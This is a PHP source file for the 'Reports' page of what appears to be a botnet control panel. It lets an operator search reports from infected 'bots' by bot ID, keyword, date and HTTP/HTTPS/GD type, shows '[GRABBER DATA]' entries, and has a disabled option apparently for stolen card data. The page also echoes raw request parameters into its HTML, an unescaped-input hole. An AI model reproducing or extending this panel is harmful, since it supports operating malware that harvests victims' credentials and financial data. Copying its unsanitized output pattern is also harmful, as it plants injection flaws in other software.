<?php

define("TPL_TITLE", "Reports");

if (!CsrConnectToDb()) die();

$reports = array();
$dates = array();
$sql = "";

$tables = array();
$tmp_tables = CsrListTables();

foreach ($tmp_tables as &$table) 
{
	$cnt = CsrSqlQueryRowEx("select count(*) from `" . $table . "`");
	if ($cnt > 0) {
		$v = intval(substr($table, -6));
		if ($v > 0)
			$tables[] = $v;
	}
}

$tables = array_reverse($tables);
foreach ($tables as &$table) 
{
	if (isset($_GET["date_from"]) && $table >= (int)$_GET["date_from"] && $table <= (int)$_GET["date_to"]) {
		CsrSetCookie("table", $table, 60 * 60);
		break;
	}
}

foreach ($tables as &$table) {
	$dates[] = array($table, substr($table, 4, 2) . "." . substr($table, 2, 2) . "." . substr($table, 0, 2));
}

ob_start();

?>

<div class="row">
	<div class="col-md-12">
	<form method='get' action="">
	<input type='hidden' name='act' value='reports'/>
	
		<table class="table table-striped table-bordered table-condensed">
			<tr> 
				<th width='80px'> Bots </th> 
				<td colspan='11' align='center'> <input class="form-control" type='text' name='bots' value='<?=@$_GET["bots"]?>'/> </td>
			</tr>
			<tr> 
				<th> Keywords </th>  
				<td colspan='11' align='center'> <input class="form-control" type='text' name='contents' value='<?=@$_GET["contents"]?>'/> </td> 
			</tr>
			<tr> 
				<th> Date from: </th>
				<td width='40px'> 
					<select name='date_from'> 
						<?
						if (!count($dates))
							echo "<option value=> -- </option>";
						?>
						
						<? foreach ($dates as &$date) { ?>
						<option value="<?=$date[0]?>" <?=@$_GET['date_from']==$date[0] ? 'selected' : ''?> > <?=$date[1]?> </option>
						<? } ?>
					</select> 
				</td>
				
				<th width='70px'> Date to: </th>
				<td width='100px'> 
					<select name='date_to'> 
						<?
						if (!count($dates))
							echo "<option value=> -- </option>";
						?>
						<? foreach ($dates as &$date) { ?>
						<option value="<?=$date[0]?>" <?=@$_GET['date_to']==$date[0] ? 'selected' : ''?>> <?=$date[1]?> </option>
						<? } ?>
					</select> 
				</td>
				
				<th width='50px'> Type: </th> 
				<td> 
					<select name='type'>
						<option value='0' <?=@$_GET['type']===0 ? 'selected' : ''?> > HTTP + HTTPS </option>
						<option value='<?=BLT_HTTPS_REPORT?>' <?=@$_GET['type']==BLT_HTTPS_REPORT ? 'selected' : ''?> > HTTPS </option>
						<option value='<?=BLT_HTTP_REPORT?>' <?=@$_GET['type']==BLT_HTTP_REPORT ? 'selected' : ''?> > HTTP </option>
						<!-- <option value='<?=BLT_CC?>' <?=@$_GET['type']==BLT_CC ? 'selected' : ''?> > СС </option> -->
						<option value='<?=BLT_GD_REPORT?>' <?=@$_GET['type']==BLT_GD_REPORT ? 'selected' : ''?> > GD </option>
					</select>
				</td> 
				
				<th width='90px'> Plain text: </th> 
				<td width=''> 
					<input type="checkbox" name="plain_text" <?=@((isset($_GET['plain_text']) && $_GET['plain_text'] == "on") ? 'checked' : '')?> />
				</td>
				
				<th width='90px'> Online only: </th> 
				<td width=''> 
					<input type="checkbox" name="online_only" <?=@((isset($_GET['online_only']) && $_GET['online_only'] == "on") ? 'checked' : '')?> />
				</td> 
				
				<th width='60px'> Unique: </th> 
				<td width=''> 
					<?if (isset($_GET["bots"])) { ?>
					<input type="checkbox" name="exclude_content" <?=@((isset($_GET['exclude_content']) && $_GET['exclude_content'] == "on") ? 'checked' : '')?> />
					<? } else { ?>
					<input type="checkbox" name="exclude_content" checked />
					<? } ?>
				</td> 
			</tr>
		</table>
		<button class="btn btn-info btn-sm"> Search </button>
	</form>
	</div>
</div>
<br/>

<script type='text/javascript'>

var is_check = false;
function CheckAll() {
	is_check = !is_check;
	var elms = document.getElementsByClassName("bot_id");
	for (var i = 0; i < elms.length; ++i) elms[i].checked = is_check;
}

var prev = { 'obj' : false, 'property' : false };

function ShowReport(date, id_report)
{
	var obj = "report_" + date.replace(/\./g, '') + id_report;	
	var ex_el = $("#show_" + obj + "");
	
	if (prev['obj']) {
		prev['obj'].css("background-color", prev['property']);
	}
	
	if (ex_el.length > 0) {
		ex_el.remove();
		return;
	}
	
	var el = $("#" + obj);
	
	prev['obj'] = el;
	prev['property'] = el.css("background-color");
	
	el.css("background-color", "#D0EAD2");
	
	$.ajax("<?=CORE_FILE?>?act=ajax&do=report&type_report=" + getUrlParameter("type") + "&id=" + id_report + "&date=" + date + "&page=" + getUrlParameter("page") + "&online_only=" + getUrlParameter("online_only") + "&plain_text=" + getUrlParameter("plain_text") + "&exclude_content=" + getUrlParameter("exclude_content"))
	 .done(function(res) 
	{
		el.after("<tr id=show_" + obj + "><td colspan=2>" + res + "</td></tr>");
	});
}

var getUrlParameter = function getUrlParameter(sParam) {
	
    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : sParameterName[1];
        }
    }
};

var last_bot_id = false;
var last_date = false;

function LoadReports()
{
	var uri = '';
	
	if (getUrlParameter("type"))
	{
		var sess = getUrlParameter("session") ? ("&session=" + getUrlParameter("session")) : "";
		var url = <?CORE_FILE?>"?act=ajax&do=reports" + 
							"&bots=" + getUrlParameter("bots") + 
							"&contents=" + getUrlParameter("contents") + 
							"&date_from=" + getUrlParameter("date_from") + 
							"&date_to=" + getUrlParameter("date_to") + 
							"&type=" + getUrlParameter("type") +
							"&online_only=" + getUrlParameter("online_only") +
							"&plain_text=" + getUrlParameter("plain_text") +
							"&exclude_content=" + getUrlParameter("exclude_content") +
							sess  + 
							"&page=" + (getUrlParameter("page") ? getUrlParameter("page") : 1) +
							"&url=" + encodeURIComponent(window.location);
								
		if (getUrlParameter("plain_text") == "on") 
		{
			$("#waiting").css("display", "none");	
			window.open(url, "_blank");
			return;
		}
								
		$.ajax(url).done(function(res) 
		{
			$("#waiting").css("display", "none");							
			
			var arr = $.parseJSON(res);
			var reports = arr["reports"];
			var h = "";
			
			for (var i = 0; i < reports.length; ++i)
			{
				var id = reports[i]["date"].replace(/\./g, '') + reports[i]["id"];
				
				if (!last_bot_id || last_bot_id != reports[i]["bot_id"] || last_date != reports[i]["date"])
				{
					h += "<tr>" +
									"<td class='header_reports col-xs-11'> <a href=\"<?CORE_FILE?>?act=bot&id=" + reports[i]["bot_id"] + "\" target='_blank'> " + reports[i]["bot_id"] + " </a></td>" +
									"<td class='header_reports'> " + reports[i]["date"] + "</td>" +
								"</tr>";
					
					last_bot_id = reports[i]["bot_id"];
					last_date = reports[i]["date"];
				}
				
				var ex = reports[i]['path'].length > 111 ? "..." : "";
				var grabberTitle = "";
				if (reports[i]['type'] == 201) {
					grabberTitle = "<font color=black>[GRABBER DATA]</font><br/> ";
				}
				
				h += "<tr id=\"report_" + id + "\">" +
							"<td colspan=\"2\">" + grabberTitle +
								"<a onclick='ShowReport(\"" + reports[i]["date"] + "\", " + reports[i]["id"] + ");' href=\"javascript:\">" + ( reports[i]['content'] ?  reports[i]['content'] : ( reports[i]['path'].substring(0, 111) + ex ) ) + "</a>" +
							"</td>" +
						"</tr>";
			}
			
			
			if (!h) {
				$("#waiting").html("Not found.");
				$("#waiting").css("display", "block");		
			}
			else 
			{
				$("#reports tr").last().after(h);
				$(".reports_nav").html(arr["nav"]);
			}
		});
	}
	else 
	{
		$("#waiting").css("display", "none");	
	}
}

$(document).ready(function() {
	LoadReports();
});

</script>

<div id="myModalBox" class="modal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-body"> </div>
    </div>
  </div>
</div>

<div class="row">
	<div class="col-xs-12">
		<ul class="reports_nav pagination pagination-sm"> </ul>
	</div>
	
	<div class="col-md-12">
		<div id="waiting"> Waiting... </div>
	<form action='' method='post'>
	<table id='reports' class="table table-striped table-bordered table-condensed table-hover">
		<tr></tr>
	</table>
	</form>
	</div>
	
	<div class="col-xs-12">
		<ul class="reports_nav pagination pagination-sm"> </ul>
	</div>
	
</div>

<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "<script src=\"template/js/jquery.js\" type=\"text/javascript\"> </script>\r\n<script src=\"template/js/bootstrap.min.js\" type=\"text/javascript\"></script>", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{REPORTS_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>